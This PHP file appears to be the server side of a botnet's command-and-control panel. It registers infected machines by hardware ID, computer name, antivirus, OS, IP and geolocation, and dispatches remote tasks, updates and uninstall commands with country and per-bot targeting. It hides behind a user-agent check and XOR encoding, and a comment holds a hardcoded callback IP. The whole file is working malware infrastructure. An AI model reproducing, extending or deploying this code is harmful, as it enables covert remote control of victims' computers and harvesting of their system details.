<?php

use GeoIp2\Database\Reader;

class BotHandler{


    public function xor_this($data) {

        $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
        $statementConfig->execute(array("1"));
        $config = $statementConfig->fetch();
        $key = $config["enryptionkey"];
        $dataLen = strlen($data);
        $keyLen = strlen($key);
        $output = $data;
        for ($i = 0; $i < $dataLen; ++$i) {
            $output[$i] = $data[$i] ^ $key[$i % $keyLen];
        }
        return $output;
    }



    public function request(){
        $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
        $statementConfig->execute(array("1"));
        $config = $statementConfig->fetch();

        if($_SERVER['HTTP_USER_AGENT'] != $config["useragent"] OR empty($_POST)){
            //echo $this->xor_this("http://35.204.135.202/request");
            // echo $this->xor_this("#7%;y~dpdeqam`xvyscd14:6487;+!");
            die("uninstall");
        }

        $gi = geoip_open(__DIR__."/../../Geo/GeoIP.dat", "");

        $reader = new Reader(__DIR__.'/../../Geo/GeoLite2-City.mmdb');




        if(!empty($_SERVER['REMOTE_ADDR'])){
            $ip = $_SERVER['REMOTE_ADDR'];
            $record = $reader->city($ip);
            $country = geoip_country_code_by_addr($gi, $ip);
            $countryName = $record->country->name;
            $countryCity = $record->city->name;
            $countryLatitude = $record->location->latitude;
            $countryLongitude = $record->location->longitude;
        }else{
            $country = "unknow";
            $countryLatitude = "";
            $countryLongitude = "";
            $countryName = "";
        }


// {0a2495a8-5af7-11e9-b637-806e6f6e6963}
//$_POST["hwid"] =  "{0a2495a8-5af7-11e9-b637-806e6f6e6963}";
        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
        $statement->execute(array($_POST["hwid"]));
        $botfound = false;
        $bot = "";
        while($row = $statement->fetch()) {
            $botfound = true;
            $bot = $row;
        }


        if($botfound){


            $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP() WHERE hwid = ?");
            $statement->execute(array($_POST["hwid"]));
            //

            if(isset($_POST["ps"]) && isset($_POST["id"])){
                //Executed Task
                $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks_completed SET status = ? WHERE taskid = ? AND bothwid = ?"); // AND taskid = ?
                $statement->execute(array($_POST["ps"], $_POST["id"], $_POST["hwid"]));
            }

            $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks ORDER BY id");
            while ($com = $cmds->fetch(PDO::FETCH_ASSOC))
            {
                if ($com['status'] == "1")
                {
                    //$executions = $GLOBALS["pdo"]->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
                    $ae = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
                    $ae->execute(array(":i" => $com['id'], ":h" => $_POST["hwid"]));
                    if ($ae->fetchColumn(0) == 0)
                    {
                        //TODO FILTER CHECKING
                        //CHECK if Filter is Empty
                        if(!empty($com["filter"])){
                            //Check if Filter is none
                            if($com["filter"] != "[]"){
                                //Filter to array
                                $filter = json_decode($com["filter"],true);
                                if(is_array($filter)){
                                    // Search Country in Filter if not found die
                                    if(!empty($filter["country-filter"])){
                                        if (strpos($filter["country-filter"], $country) == false) {
                                            die("waiting");
                                        }
                                    }

                                    //Check if Bot Only Ececution
                                    if(!empty($filter["onlybot"])) {
                                        if($filter["onlybot"] != $bot["id"]){
                                                die();
                                        }
                                    }

                                }
                            }
                        }

                        if($com["task"] == "uninstall"){
                            echo $com["task"];
                        }elseif($com["task"] == "update"){
                            echo "update;".$com["id"].";".$com["command"];
                        } else{
                            echo "newtask;".$com["id"].";".$com["command"];
                        }
                        //send taskID

                        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks_completed (bothwid, taskid, status) VALUES (?, ?, ?)");
                        $statement->execute(array($_POST["hwid"], $com["id"], "send"));
                        //insert Send
                        // Get Executed or Failed
                        break;
                    }
                }
            }

        }else{
            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
            $statement->execute(array(
                $_POST["av"],
                $_POST["hwid"],
                $this->xor_this($_POST["username"]),
                $country,
                $this->xor_this($_POST["nf2"]),
                $this->xor_this($_POST["nf3"]),
                $this->xor_this($_POST["nf35"]),
                $this->xor_this($_POST["nf4"]),
                $countryLatitude,
                $countryLongitude,
                $countryName,
                $ip,
                $_POST["os"],
                $this->xor_this($_POST["botversion"])
            ));
        }
        echo "waiting";
        die();
    }

}